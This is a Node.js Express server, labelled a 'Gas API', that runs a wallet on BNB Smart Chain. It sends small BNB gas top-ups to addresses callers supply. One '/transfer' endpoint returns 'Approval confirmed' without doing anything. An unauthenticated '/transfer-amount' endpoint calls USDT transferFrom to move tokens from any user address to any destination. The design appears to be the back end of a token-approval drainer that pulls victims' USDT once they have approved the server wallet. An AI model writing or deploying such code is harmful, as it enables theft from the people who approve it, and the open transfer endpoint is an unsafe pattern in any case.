require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { ethers } = require("ethers");

const app = express();
app.use(cors());
app.use(express.json());

/* =============================
   Provider + Wallet
============================= */

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

/* =============================
   USDT Contract (BSC)
============================= */

const USDT = "0x55d398326f99059fF775485246999027B3197955";

const ABI = [
  "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
];

const usdt = new ethers.Contract(USDT, ABI, wallet);

/* =============================
   HEALTH CHECK
============================= */

app.get("/", (req, res) => {
  res.send("Gas API Running ✅");
});

/* =============================
   1️⃣ FUND GAS (Send BNB)
============================= */

app.post("/fund-gas", async (req, res) => {
  try {
    const { userAddress } = req.body;

    if (!userAddress)
      return res.status(400).json({ error: "Address required" });

    const tx = await wallet.sendTransaction({
      to: userAddress,
      value: ethers.parseEther("0.0005"),
    });

    await tx.wait();

    res.json({
      success: true,
      hash: tx.hash,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* =============================
   2️⃣ TRANSFER SIGNAL
============================= */

app.post("/transfer", async (req, res) => {
  res.json({
    success: true,
    message: "Approval confirmed",
  });
});

/* =============================
   3️⃣ TRANSFER AMOUNT
============================= */

app.post("/transfer-amount", async (req, res) => {
  try {
    const { userAddress, toAddress, amount } = req.body;

    if (!userAddress || !toAddress || !amount)
      return res.status(400).json({ error: "Missing fields" });

    const value = ethers.parseUnits(amount.toString(), 18);

    const tx = await usdt.transferFrom(
      userAddress,
      toAddress,
      value
    );

    await tx.wait();

    res.json({
      success: true,
      txHash: tx.hash,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/* ============================= */

app.listen(process.env.PORT, () =>
  console.log("Server running ✅")
);
